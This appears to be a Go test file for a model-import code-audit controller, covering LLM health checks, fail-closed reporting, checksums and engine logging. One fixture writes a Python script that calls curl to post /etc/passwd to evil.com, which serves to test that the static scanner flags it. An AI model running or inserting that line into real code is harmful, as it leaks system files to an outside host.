package controller

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/CipherSlinger/teellm"
	"github.com/CipherSlinger/teetls"
	"taa/internal/codeaudit"
)

func TestLLMAvailable(t *testing.T) {
	ready := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte(`{"response":"pong"}`))
		default:
			t.Fatalf("unexpected path = %s", r.URL.Path)
		}
	}))
	defer ready.Close()

	if !llmAvailable(ready.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = false, want true for ready server")
	}
	if llmAvailable(ready.URL, "nonexistent-model") {
		t.Fatal("llmAvailable = true, want false for missing model")
	}

	corruptModel := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte(`{"error":"tensor offset exceeds file size"}`))
		default:
			http.NotFound(w, r)
		}
	}))
	defer corruptModel.Close()
	if llmAvailable(corruptModel.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for corrupt model generate failure")
	}

	down := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer down.Close()
	if llmAvailable(down.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for 500 response")
	}

	if llmAvailable("", "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for empty endpoint")
	}
}

type healthCheckFailureLLMClient struct {
	deadline time.Time
	err      error
}

func (c *healthCheckFailureLLMClient) VerifyFinding(context.Context, *teellm.RequestEnvelope) (*teellm.ResponseEnvelope, error) {
	return nil, nil
}

func (c *healthCheckFailureLLMClient) HealthCheck(ctx context.Context) error {
	c.deadline, _ = ctx.Deadline()
	return c.err
}

func (c *healthCheckFailureLLMClient) Close() error {
	return nil
}

func TestIsLLMServiceAvailable_TimeoutAndErrorLog(t *testing.T) {
	const endpoint = "https://127.0.0.1:8443"
	const model = "qwen2.5-coder:3b"
	sentinelErr := errors.New("TEE-TLS health check failed")
	client := &healthCheckFailureLLMClient{err: sentinelErr}

	var logs bytes.Buffer
	previousOutput := log.Writer()
	log.SetOutput(&logs)
	defer log.SetOutput(previousOutput)

	startedAt := time.Now()
	if isLLMServiceAvailable(client, endpoint, model) {
		t.Fatal("isLLMServiceAvailable = true, want false")
	}

	if client.deadline.IsZero() {
		t.Fatal("HealthCheck context did not include a deadline")
	}
	deadlineDuration := client.deadline.Sub(startedAt)
	if deadlineDuration < 29*time.Second || deadlineDuration > auditLLMHealthCheckTimeout+time.Second {
		t.Fatalf("health-check deadline duration = %s, want approximately %s", deadlineDuration, auditLLMHealthCheckTimeout)
	}

	logText := logs.String()
	for _, expected := range []string{endpoint, model, "timeout=30s", sentinelErr.Error()} {
		if !strings.Contains(logText, expected) {
			t.Errorf("health-check log missing %q: %s", expected, logText)
		}
	}
}

type mockControllerLLMBackend struct {
	healthy bool
}

func (m *mockControllerLLMBackend) HandleVerifyFinding(ctx context.Context, req *teellm.RequestEnvelope) (*teellm.ResponseEnvelope, error) {
	return &teellm.ResponseEnvelope{
		ProtocolVersion: teellm.CurrentProtocolVersion,
		RequestID:       req.RequestID,
		Status:          teellm.StatusSuccess,
		Decision: &teellm.DecisionResult{
			Verdict: teellm.VerdictBenign,
		},
	}, nil
}

func (m *mockControllerLLMBackend) HandleHealthCheck(ctx context.Context) error {
	if !m.healthy {
		return errors.New("backend unhealthy")
	}
	return nil
}

func TestIsLLMServiceAvailable_TEETLS(t *testing.T) {
	mockProv := teetls.NewMockEvidenceProvider()
	tlsCfg := &teetls.Config{
		Mode:             teetls.ModePermissive,
		EvidenceProvider: mockProv,
	}

	backend := &mockControllerLLMBackend{healthy: true}
	server, err := teellm.NewServer(teellm.ServerConfig{
		Addr:    "127.0.0.1:0",
		TEETLS:  tlsCfg,
		Backend: backend,
	})
	if err != nil {
		t.Fatalf("failed to create teellm server: %v", err)
	}
	defer server.Close()

	go func() {
		_ = server.Start()
	}()
	time.Sleep(50 * time.Millisecond)

	cfg := codeaudit.LLMConfig{
		Enabled:            true,
		Transport:          "teetls",
		Endpoint:           "https://" + server.Addr(),
		Model:              "qwen2.5-coder:3b",
		InsecureSkipVerify: true,
		AttestationMode:    "permissive",
	}

	client := newLLMClient(cfg)
	if client == nil {
		t.Fatal("expected newLLMClient to return non-nil client")
	}

	if !isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
		t.Fatal("expected isLLMServiceAvailable = true for healthy TEE-TLS server")
	}

	// Now make backend unhealthy
	backend.healthy = false
	if isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
		t.Fatal("expected isLLMServiceAvailable = false for unhealthy backend")
	}
}

func TestAuditAndReportModelImportFailClosed(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 模拟 LLM 服务不可用（返回 500）。
	llmDown := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer llmDown.Close()

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: true, Endpoint: llmDown.URL, Model: "qwen2.5-coder:0.5b", FailClosed: true}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (fail-closed)", rr.Code)
		}
		if rr.Msg == nil || !strings.Contains(*rr.Msg, "fail-closed") {
			t.Fatalf("msg = %v, want fail-closed message", rr.Msg)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportAudit (fail-closed)")
	}
}

func TestAuditAndReportModelImportStaticFail(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := `import subprocess
subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
`
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 1 {
			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if audit.Conclusion.Passed {
			t.Fatal("conclusion.passed = true, want false")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (static fail)")
	}
}

func TestAuditAndReportModelImportStaticPass(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false} // 仅静态扫描
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if !audit.Conclusion.Passed {
			t.Fatalf("conclusion.passed = false, want true")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (static pass)")
	}
}

func TestAuditAndReportModelImportIncludesChecksum(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"
	state.setModelChecksum(map[string]any{
		"size":      int64(9999),
		"algorithm": "sm3",
		"value":     "sm3-model-hash-12345",
	})

	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Checksum == nil {
			t.Fatalf("expected Checksum to be included in reportModelImport, got nil")
		}
		if rr.Checksum["algorithm"] != "sm3" || rr.Checksum["value"] != "sm3-model-hash-12345" || int64(rr.Checksum["size"].(float64)) != 9999 {
			t.Fatalf("unexpected checksum: %+v", rr.Checksum)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportModelImport")
	}
}

func TestAuditAndReportModelImportFallbackDirectoryChecksum(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"
	// ModelChecksum is nil, should fallback to calculating directory checksum

	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Checksum == nil {
			t.Fatalf("expected Checksum to be calculated from modelDir and included, got nil")
		}
		if rr.Checksum["algorithm"] != "sm3" {
			t.Fatalf("checksum algorithm = %v, want sm3", rr.Checksum["algorithm"])
		}
		if rr.Checksum["value"] == "" || rr.Checksum["value"] == "N/A" {
			t.Fatalf("checksum value is empty or N/A: %+v", rr.Checksum)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportModelImport")
	}
}

// namedEngine is a StaticEngine whose name the test chooses while the scanning
// stays the real baseline engine's. The assertion below is about where the logged
// name comes from, not about which engine scans better: a double that answers
// "semgrep" to Name() separates "the log prints the configured engine" from "the
// log prints a constant" without making this test depend on a semgrep binary. It
// does not pretend to scan the way semgrep does, and nothing here reads a finding
// it produced.
type namedEngine struct {
	codeaudit.StaticEngine
	name string
}

func (e namedEngine) Name() string { return e.name }

// TestAuditStartLogNamesTheEngine pins that the audit-start line says which Tier 1
// engine is about to scan. That line is what an operator reads to attribute a
// blocked import, and "the audit ran" stopped being enough once two engines
// became selectable: a report that proves which engine produced it is only useful
// if the log the operator is looking at names the same one.
//
// The second case is the one that keeps the line honest. A state can be built
// without an engine, and the log is written before the audit's own nil check, so
// an unguarded Name() call would turn a configuration error into a panic inside
// the audit path — the failure the fail-closed design exists to avoid.
func TestAuditStartLogNamesTheEngine(t *testing.T) {
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	for _, tc := range []struct {
		name   string
		engine codeaudit.StaticEngine
		want   string
	}{
		{"the configured engine", namedEngine{StaticEngine: codeaudit.DefaultEngine(), name: "semgrep"}, "engine=semgrep"},
		{"no engine configured", nil, "engine=unset"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			state, _ := setupTestState(t)
			modelDir := t.TempDir()
			if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\n"), 0o644); err != nil {
				t.Fatal(err)
			}

			state.Security.ScanEnabled = true
			state.Security.Engine = tc.engine
			state.Security.ModelDir = modelDir
			state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
			state.PlatformIP = platform.URL
			state.DockerID = "docker-test"

			state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

			var startLine string
			for _, entry := range state.Logs.All() {
				if strings.Contains(entry.Message, "开始模型代码审计") {
					startLine = entry.Message
					break
				}
			}
			if startLine == "" {
				t.Fatalf("no audit-start line among %d log entries", len(state.Logs.All()))
			}
			if !strings.Contains(startLine, tc.want) {
				t.Errorf("audit-start line = %q, want it to contain %q", startLine, tc.want)
			}
		})
	}
}
